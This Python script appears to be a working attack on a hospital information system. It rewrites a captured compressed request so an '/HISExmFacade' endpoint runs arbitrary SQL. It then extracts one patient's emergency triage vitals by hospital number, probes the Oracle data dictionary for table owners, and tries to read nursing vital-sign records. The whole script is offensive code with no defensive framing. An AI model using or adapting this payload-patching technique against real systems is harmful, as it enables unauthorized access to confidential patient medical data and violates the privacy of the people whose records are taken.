from his_client_final import HISClient
import requests
import zlib

class QualifiedHunter(HISClient):
    def execute_sql(self, sql):
        print(f"[*] Executing: {sql.strip()}")
        try:
             # Use EXM payload
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()

            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            
            target_len = len(original_sql_bytes)
            
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}). Cannot execute.")
                return None
            
            padded_sql = sql.ljust(target_len)
            
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

hunter = QualifiedHunter()
hhistnum = '003617083J'

# List of queries to try
queries = [
    f"SELECT * FROM COMMON.PAT_EMG_TRIAGE WHERE HHISNUM = '{hhistnum}'"
]

# 1. Inspect Triage Data
for q in queries:
    res = hunter.execute_sql(q)
    if res and "<NewDataSet>" in res:
             print(f"[+] Data returned for {q}!")
             # Extract values using Regex to avoid huge print
             import re
             for field in ['WEIGHT', 'TEMPERATURE', 'SPO2', 'SBP', 'DBP', 'PULSE']:
                 match = re.search(f"<{field}>(.*?)</{field}>", res)
                 if match:
                     print(f"  {field}: {match.group(1)}")
             
             if "49.1" in res: print("!!! FOUND 49.1 !!!")
             if "157" in res: print("!!! FOUND 157 !!!")

# 2. Find Owner of NUR_VITALSIGN
print("\n--- Finding Owner of NUR_VITALSIGN ---")
res = hunter.execute_sql("SELECT OWNER, TABLE_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME = 'NUR_VITALSIGN'")
if res and "NewDataSet" in res:
    print(res[:2000])
    
    # Extract owner
    match = re.search(r'<OWNER>(.*?)</OWNER>', res)
    if match:
        owner = match.group(1)
        print(f"[+] Owner found: {owner}")
        
        # Try Querying
        q_nur = f"SELECT * FROM {owner}.NUR_VITALSIGN WHERE HHISNUM = '{hhistnum}'"
        print(f"[*] Executing: {q_nur}")
        res_nur = hunter.execute_sql(q_nur)
        if res_nur:
            if "ORA-00942" in res_nur:
                print("[-] No permission for NUR_VITALSIGN.")
            elif "<NewDataSet>" in res_nur:
                print("[+] NUR_VITALSIGN Data Found!")
                print(res_nur[:1000])
                if "49.1" in res_nur: print("!!! FOUND 49.1 in NUR_VITALSIGN !!!")
                if "157" in res_nur: print("!!! FOUND 157 in NUR_VITALSIGN !!!")

